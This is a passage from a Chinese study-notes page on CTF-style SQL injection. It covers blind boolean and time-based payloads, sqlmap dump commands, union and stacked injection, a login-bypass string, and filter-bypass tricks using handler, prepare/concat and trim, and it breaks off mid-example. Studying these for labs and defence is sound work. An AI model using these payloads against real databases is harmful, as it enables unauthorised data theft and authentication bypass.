id="布尔盲注-字符型为例"><a href="#布尔盲注-字符型为例" class="headerlink" title="布尔盲注(字符型为例)"></a>布尔盲注(字符型为例)</h4><p>适用于回显只有两种的情况，如<code>User ID exists in the database.</code>和<code>User ID is MISSING from the database.</code>分别对应了输入语句返回的布尔值。</p><ul><li>如果采用手动注入，一般要结合二分查找、穷举法等方法来逐一破解出库、表、字段的名称。(以下为猜解数据库名称的例子)</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1&#x27;</span> <span class="hljs-keyword">union</span> select <span class="hljs-title function_">count</span><span class="hljs-params">(schema_name)</span> from information_schema.schemata)&gt; n # <span class="hljs-comment">//猜解数据库个数</span><br>1&#x27; and <span class="hljs-title function_">length</span><span class="hljs-params">(database())</span>=n # <span class="hljs-comment">//n为大于1的整数,猜解数据库名称长度</span><br><span class="hljs-number">1&#x27;</span> <span class="hljs-keyword">union</span> select <span class="hljs-title function_">ascii</span><span class="hljs-params">(substr((select schema_name from information_schema.schemata limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))</span>)&gt;n # <span class="hljs-comment">//n为大小写字母对应的ASCII码值，此处需借用二分查找来逐一确定每一个数据库的名称</span><br></code></pre></td></tr></table></figure><ul><li>可以借用sqlmap工具来自动化实现这种机器的过程，mac下具体指令为</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">sqlmap -u <span class="hljs-string">&quot;网址&quot;</span> --batch --dbs  <span class="hljs-comment">//获取数据库名称,batch意思为不询问输入默认输入Y</span><br>sqlmap -u <span class="hljs-string">&quot;网址&quot;</span> --batch -D 数据库名 --tables <span class="hljs-comment">//获取表名</span><br>sqlmap -u <span class="hljs-string">&quot;网址&quot;</span> --batch -D 数据库名 -T 表名 --columns <span class="hljs-comment">//获取字段名</span><br>sqlmap -u <span class="hljs-string">&quot;网址&quot;</span> --batch -D 数据库名 -T 表名 -C 字段名 --dump <span class="hljs-comment">//获取字段内存储信息</span><br></code></pre></td></tr></table></figure><p>最终得到flag<br><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032222451.png" alt="1"></p><h4 id="时间盲注-字符型为例"><a href="#时间盲注-字符型为例" class="headerlink" title="时间盲注(字符型为例)"></a>时间盲注(字符型为例)</h4><p>仅要求有回显，主要原理是利用SQL中if函数及sleep函数再加上其他用于拆解字符串、转换字符为ASCII码值的函数，sleep函数作为if函数的第二个参数，猜解名称的函数作为if的第一个参数，第三个参数可以任意赋值，但不能与sleep函数相同，因此若猜解函数返回正确，则执行sleep函数，效果为网页延迟了设定的描述才显示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1&#x27;</span> and <span class="hljs-title function_">if</span> <span class="hljs-params">((ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">100</span>),sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)</span> # <span class="hljs-comment">//判断数据库名称第一个字符是否为&#x27;d&#x27;，结果显示明显延迟</span><br></code></pre></td></tr></table></figure><h2 id="三、判断注入点"><a href="#三、判断注入点" class="headerlink" title="三、判断注入点"></a>三、判断注入点</h2><h3 id="3-1判断是否存在SQL注入漏洞"><a href="#3-1判断是否存在SQL注入漏洞" class="headerlink" title="3.1判断是否存在SQL注入漏洞"></a>3.1判断是否存在SQL注入漏洞</h3><p>输入<code>1&#39;</code>如果报错，则存在注入漏洞，报错原因是单引号数量不匹配，如果没报错，说明可能该网页过滤了单引号</p><h3 id="3-2判断是字符型还是整数型"><a href="#3-2判断是字符型还是整数型" class="headerlink" title="3.2判断是字符型还是整数型"></a>3.2判断是字符型还是整数型</h3><ul><li>输入<code>1 and 1=2</code>和<code>1&#39;#</code>和<code>1&#39; and &#39;1&#39;=&#39;1</code>若都回显id为1的信息,则为字符型</li><li>输入<code>1 and 1=2</code>没有回显，且输入<code>1 and 1=1</code>有回显，则为数字型,原因<code>1 and 1=2</code>恒为假，过滤掉所有的行</li></ul><h3 id="3-3判断能否时间盲注"><a href="#3-3判断能否时间盲注" class="headerlink" title="3.3判断能否时间盲注"></a>3.3判断能否时间盲注</h3><table><thead><tr><th align="left">MySQL</th><th align="left">benchmark(100000000,md(5))sleep(3)</th></tr></thead><tbody><tr><td align="left">PostgreSQL</td><td align="left">PG_sleep(5)Generate_series(1,1000000)</td></tr><tr><td align="left">SQLServer</td><td align="left">waitfor delay ‘0:0:5’</td></tr></tbody></table><h3 id="3-4判断数据库类型"><a href="#3-4判断数据库类型" class="headerlink" title="3.4判断数据库类型"></a>3.4判断数据库类型</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>判断是否是 Mysql数据库<span class="hljs-string">&#x27;</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span><span class="hljs-operator">*</span><span class="hljs-keyword">from</span> information_schema.tables) #<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>判断是否是 access数据库<span class="hljs-string">&#x27;</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span><span class="hljs-operator">*</span><span class="hljs-keyword">from</span> msysobjects) #<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>判断是否是 Sqlserver数据库<span class="hljs-string">&#x27;</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span><span class="hljs-operator">*</span><span class="hljs-keyword">from</span> sysobjects) #<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>判断是否是Oracle数据库<span class="hljs-string">&#x27;</span><br><span class="hljs-string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> dual)<span class="hljs-operator">&gt;</span><span class="hljs-number">0</span> #<br></code></pre></td></tr></table></figure><h2 id="四、常用函数、基础知识"><a href="#四、常用函数、基础知识" class="headerlink" title="四、常用函数、基础知识"></a>四、常用函数、基础知识</h2><h3 id="系统函数"><a href="#系统函数" class="headerlink" title="系统函数"></a>系统函数</h3><ul><li>system_user()——系统用户名 </li><li>user()——用户名 </li><li>current_user()——当前用户名 </li><li>session_user()——链接数据库的用户名 </li><li>database()——数据库名 </li><li>version()——数据库版本 </li><li>@@datadir——数据库路径 </li><li>@@basedir——数据库安装路径 </li><li>@@version_conpile_os——操作系统</li></ul><h3 id="字符串连接函数"><a href="#字符串连接函数" class="headerlink" title="字符串连接函数"></a>字符串连接函数</h3><ul><li>concat(str1,str2,…)——没有分隔符地连接字符串 </li><li>concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串 </li><li>group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据。</li></ul><h3 id="两种注释"><a href="#两种注释" class="headerlink" title="两种注释"></a>两种注释</h3><ul><li>–+</li><li><code>#</code>(url编码%23)</li></ul><h3 id="sql中的逻辑运算"><a href="#sql中的逻辑运算" class="headerlink" title="sql中的逻辑运算"></a>sql中的逻辑运算</h3><p>万能密码构造</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">username<span class="hljs-operator">=</span>’admin’ andpassword<span class="hljs-operator">=</span>’’<span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><blockquote><p>在sql中and运算符优先级大于or运算符，类比&amp;&amp;&gt;||</p></blockquote><p>sql中也能使用位运算</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">Select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-operator">&amp;</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><blockquote><p>&amp;的优先级大于&#x3D;</p></blockquote><h3 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> 字段 [<span class="hljs-keyword">asc</span><span class="hljs-operator">|</span><span class="hljs-keyword">desc</span>]; # <span class="hljs-keyword">asc</span>升序，默认的<br></code></pre></td></tr></table></figure><blockquote><p>用于判断列数，不知道列名时用1 2 3……表示第1 2 3……列</p></blockquote><h3 id="系统数据库（information-schema）"><a href="#系统数据库（information-schema）" class="headerlink" title="系统数据库（information_schema）"></a>系统数据库（information_schema）</h3><p>mysql版本&gt;&#x3D;5.0</p><p>该库中有三个表schemata(各数据库名schema_name)、tables(各表名table_name)、columns(各列名)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata # 查数据库名<br><span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;xxxxx&#x27;</span>; #查表名<br><span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;xxxxx&#x27;</span>; #查列名 <br></code></pre></td></tr></table></figure><h2 id="五、注入类型"><a href="#五、注入类型" class="headerlink" title="五、注入类型"></a>五、注入类型</h2><h3 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h3><p><strong>依据注入点类型分类</strong></p><ul><li><p>数字类型的注入</p></li><li><p>字符串类型的注入</p></li><li><p>搜索型注入</p></li></ul><p><strong>依据提交方式分类</strong></p><ul><li><p>GET注入</p></li><li><p>POST注入</p></li><li><p>COOKIE注入</p></li><li><p>HTTP头注入(XFF注入、UA注入、REFERER注入）</p></li></ul><p><strong>依据获取信息的方式分类</strong></p><ul><li><p>基于布尔的盲注</p></li><li><p>基于时间的盲注</p></li><li><p>基于报错的注入</p></li><li><p>联合查询注入</p></li><li><p>堆叠注入 (可同时执行多条语句)</p></li></ul><h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><p>要求列数一致</p><h3 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;</span><br><span class="hljs-string">?id=-1&#x27;</span>  <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><blockquote><p>整型的也差不多，去掉’</p><p>部分题目也可能在字符型基础上加括号等,若注释被屏蔽</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> …… <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;1</span><br></code></pre></td></tr></table></figure></blockquote><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>多条sql语句一起执行,利用加<code>;</code>的操作</p><h3 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h3><p>受到API或数据库引擎不支持，权限不足等</p><h3 id="常见思路"><a href="#常见思路" class="headerlink" title="常见思路"></a>常见思路</h3><p>可考虑使用RENAME关键字，将想要的数据列名&#x2F;表名更改成返回数据的SQL语句所定义的表&#x2F;列名。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> tables; #查看所有表<br><span class="hljs-keyword">show</span> columns <span class="hljs-keyword">from</span> `表名`; #看列<br>RENAME <span class="hljs-keyword">TABLE</span> `words` <span class="hljs-keyword">TO</span> `words1`; #改名为words1<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> `words` CHANGE `flag` `id` <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>;#将新words表的列flag改为id<br></code></pre></td></tr></table></figure><h3 id="常见bypass"><a href="#常见bypass" class="headerlink" title="常见bypass"></a>常见bypass</h3><p>过滤select时，使用handler语句（mysql专用语句）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">handler users <span class="hljs-keyword">open</span> <span class="hljs-keyword">as</span> hd; #指定数据表users进行载入并将返回句柄重命名为hd<br>handler hd read <span class="hljs-keyword">first</span>; #读取指定表<span class="hljs-operator">/</span>句柄的首行数据<br>handler hd read next; #读取指定表<span class="hljs-operator">/</span>句柄的下一行数据<br>handler hd <span class="hljs-keyword">close</span>; #关闭句柄<br></code></pre></td></tr></table></figure><p>预处理</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">prepare</span> xxx <span class="hljs-keyword">from</span> &quot;sql语句&quot;;<br><span class="hljs-keyword">execute</span> xxx;<br>#由于<span class="hljs-keyword">sql</span>语句是字符串，因此可以使用操作字符串的函数，绕过一些过滤<br>#比如过滤了<span class="hljs-keyword">select</span><br><span class="hljs-keyword">PREPARE</span> st <span class="hljs-keyword">from</span> concat(<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;elect&#x27;</span>, <span class="hljs-string">&#x27; * from `1919810931114514`&#x27;</span>);<span class="hljs-keyword">EXECUTE</span> st;#<br></code></pre></td></tr></table></figure><p>例题：强网杯随便注</p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><h3 id="截取字符串常用函数"><a href="#截取字符串常用函数" class="headerlink" title="截取字符串常用函数"></a>截取字符串常用函数</h3><ul><li><p>mid(): <code>mid(s,n,len);</code> 从字符串 s 的 n 位置截取长度为 len 的子字符串</p></li><li><p>substr()&#x2F;substring(): <code>substr(s, start, length); substring(s, start, length)</code> 从字符串 s 的 start 位置截取长度为 length 的子字符串</p></li><li><p>left(): <code>left(s,n);</code> 返回字符串 s 的前 n 个字符</p></li><li><p>right(): <code>right(s,n);</code> 返回字符串 s 的后 n 个字符</p></li><li><p>ascii()&#x2F;ord() <code>ascii(s);/ord(s);</code> 返回字符串 s 的第一个字符的 ASCII 码。 这里不考虑多字节字符，比如汉字</p></li><li><p>trim()&#x2F;rtrim()&#x2F;ltrim() </p><ul><li><code>ltrim(s);</code> 去掉字符串s开始处的空格 </li><li><code>rtrim(s);</code> 去掉字符串s结尾处的空格 </li><li><code>trim(s);</code> 去掉字符串开始和结尾处的空格</li></ul><blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-built_in">TRIM</span>([<span class="hljs-keyword">BOTH</span><span class="hljs-operator">/</span><span class="hljs-keyword">LEADING</span><span class="hljs-operator">/</span><span class="hljs-keyword">TRAILING</span>] 目标字符串 <span class="hljs-keyword">FROM</span> 源字符串);<br><span class="hljs-keyword">BOTH</span>删除两边的指定字符串 <br><span class="hljs-keyword">LEADING</span>删除左边的指定字符串 <br>TARILING删除右边的指定字符串<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">trim</span>(<span class="hljs-keyword">LEADING</span> &quot;a&quot; <span class="hljs-keyword">from</span> &quot;abcd&quot;) <span class="hljs-operator">=</span> <span class="hljs-built_in">trim</span>(<span class="hljs-keyword">LEADING</span> &quot;b&quot; <span class="hljs-keyword">from</span> &quot;abcd&quot;);<br></code></pre></td></tr></table></figure><p>以这个为例，我们将删除的字符串ASCII差限制在1，例如a和b 当这个结果返回0时(说明有一个成功匹配)，则第一个字符是a或者b。 </p><p>接着让a的ASCII+2变成c，如果返回1(bc都不匹配)，则字符串第一位为a，反之第一位为b。</p><p>这样做的目的是为了方便写脚本 第二个字符判断 select trim(LEADING “aa” from “abcd”) &#x3D; trim(LEADING “ab” from “abcd”); 接着重复上面的过程，判断第二个字符 以此推出整个字符串</p><p>如果&#x3D;用regexp替代那么正确的字符一定在regexp前面以这个abcd为例 Trim(leading ‘a’ from ‘abcd’) regexp trim(LEADING ‘x’ from ‘abcd’) 就是bcd regexp abcd返回0， 如果反过来就是abcd regexp bcd 返回1 因此只需判断第一步即可，而不需要ASCII+2去判断了 </p><p>⚠️：如果用regexp，要先在<code>trim(LEADING &quot;a&quot; from &quot;abcd&quot;) != trim(LEADING &quot;b&quot; from &quot;abcd&quot;)</code>的条件下，因为两个相同字符串间的regexp也会返回1</p><p>注：y1ng师傅在[HFCTF 2021 Final]hatenum中用到了这个方法，通过持续递归，多次套娃trim。如果字符串长度被限制，可使用。一次只截断几个字符</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">trim</span>(<span class="hljs-keyword">LEADING</span> &quot;b&quot; <span class="hljs-keyword">from</span> <span class="hljs-built_in">trim</span>(<span class="hljs-keyword">LEADING</span> &quot;a&quot; <span class="hljs-keyword">from</span> &quot;abcd&quot;)); <span class="hljs-comment">-- cd </span><br></code></pre></td></tr></table></figure><p>先截断a，返回字符串bcd，在截断b，返回字符串cd</p></blockquote></li><li><p>Insert()</p><blockquote><p><code>INSERT(s1,x,len,s2)</code> 字符串 s2 替换 s1 的 x 位置开始长度为 len 的字符串</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql">例子：第一步删除起始的前x位<br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">INSERT</span>(&quot;abcdef&quot;, <span class="hljs-number">1</span>,<span class="hljs-number">0</span>, &quot;&quot;);<br><span class="hljs-comment">-- 输出：abcdef</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">INSERT</span>(&quot;abcdef&quot;, <span class="hljs-number">1</span>,<span class="hljs-number">1</span>, &quot;&quot;);<br><span class="hljs-comment">-- 输出：bcdef</span><br>第二步套娃删除x<span class="hljs-operator">+</span><span class="hljs-number">1</span>位以后的所有<br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">INSERT</span>((<span class="hljs-keyword">INSERT</span>(&quot;abcdef&quot;, <span class="hljs-number">1</span>,<span class="hljs-number">0</span>, &quot;&quot;)),<span class="hljs-number">2</span>,<span class="hljs-number">9999</span>,&quot;&quot;);<br><span class="hljs-comment">-- 输出：a</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">INSERT</span>((<span class="hljs-keyword">INSERT</span>(&quot;abcdef&quot;, <span class="hljs-number">1</span>,<span class="hljs-number">1</span>, &quot;&quot;)),<span class="hljs-number">2</span>,<span class="hljs-number">9999</span>,&quot;&quot;);<br><span class="hljs-comment">-- 输出：b</span><br></code></pre></td></tr></table></figure></blockquote></li></ul><h3 id="盲注常用方法"><a href="#盲注常用方法" class="headerlink" title="盲注常用方法"></a>盲注常用方法</h3><ul><li><p>if&#x2F;case 用在select查询当中，当做一种条件来进行判断</p><blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql">if(条件,为真结果,为假结果)<br># <span class="hljs-keyword">case</span>语法（两种）<br>简单函数 <br><span class="hljs-keyword">CASE</span> [col_name] <span class="hljs-keyword">WHEN</span> [value1] <span class="hljs-keyword">THEN</span> [result1]…<span class="hljs-keyword">ELSE</span> [<span class="hljs-keyword">default</span>] <span class="hljs-keyword">END</span><br>搜索函数 <br><span class="hljs-keyword">CASE</span> <span class="hljs-keyword">WHEN</span> [expr] <span class="hljs-keyword">THEN</span> [result1]…<span class="hljs-keyword">ELSE</span> [<span class="hljs-keyword">default</span>] <span class="hljs-keyword">END</span><br><span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;b&#x27;</span> <span class="hljs-keyword">when</span> <span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-keyword">then</span> <span class="hljs-number">1</span> <span class="hljs-keyword">when</span> <span class="hljs-string">&#x27;b&#x27;</span> <span class="hljs-keyword">then</span> <span class="hljs-number">2</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">end</span>; #<span class="hljs-number">2</span><br><span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-keyword">when</span> <span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-keyword">then</span> <span class="hljs-number">1</span>  <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">end</span>; #<span class="hljs-number">1</span><br><span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> <span class="hljs-number">98</span><span class="hljs-operator">&gt;</span><span class="hljs-number">12</span> <span class="hljs-keyword">then</span> <span class="hljs-number">1</span> <span class="hljs-keyword">when</span> <span class="hljs-number">3</span><span class="hljs-operator">&lt;</span><span class="hljs-number">1</span> <span class="hljs-keyword">then</span> <span class="hljs-number">2</span> <span class="hljs-keyword">when</span> <span class="hljs-number">98</span><span class="hljs-operator">&gt;</span><span class="hljs-number">3</span> <span class="hljs-keyword">then</span> <span class="hljs-number">3</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">end</span>; #<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>搜索函数优先匹配第一个为真的条件,也可以只写一个条件，代替if语句</p></blockquote></li><li><p>regexp&#x2F;rlike 正则表达式注入（可以代替if）</p><blockquote> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(if((<span class="hljs-keyword">user</span>() regexp <span class="hljs-string">&#x27;^r&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">0</span>));<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">user</span>() regexp<span class="hljs-string">&#x27;^ri&#x27;</span>); # i表示不区分大小写<br><br><span class="hljs-keyword">select</span> rpad(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">4999999</span>,<span class="hljs-string">&#x27;a&#x27;</span>) RLIKE concat(repeat(<span class="hljs-string">&#x27;(a.*)+&#x27;</span>,<span class="hljs-number">30</span>),<span class="hljs-string">&#x27;b&#x27;</span>);<br></code></pre></td></tr></table></figure> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> information_schema.tables<br><span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> table_name regexp <span class="hljs-string">&#x27;^us[a-z]&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p> 这里只要更换regexp表达式即可</p><p> <img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032231275.jpg" alt="image-20220708162044974"></p><p> 注：regexp不区分大小写，需要大小写敏感要加上binary关键字</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-type">binary</span> database() regexp &quot;^CTF&quot;;<br></code></pre></td></tr></table></figure></blockquote></li><li><p>like匹配注入(适用于&#x3D;被过滤)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;ro%&#x27;</span>;<br></code></pre></td></tr></table></figure></li><li><p>benchmark函数 测试操作性能</p></li><li><p>get_lock</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>第一个连接<br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> get_lock(<span class="hljs-string">&#x27;aaa&#x27;</span>,<span class="hljs-number">1</span>);<br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------+</span><br><span class="hljs-operator">|</span> get_lock(<span class="hljs-string">&#x27;aaa&#x27;</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------+</span><br><span class="hljs-operator">|</span>                 <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>打开另一个cmd  再次连接mysql，执行get_lock，发现延时<br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> get_lock(<span class="hljs-string">&#x27;aaa&#x27;</span>,<span class="hljs-number">1</span>);<br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------+</span><br><span class="hljs-operator">|</span> get_lock(<span class="hljs-string">&#x27;aaa&#x27;</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------+</span><br><span class="hljs-operator">|</span>                 <span class="hljs-number">0</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">1.00</span> 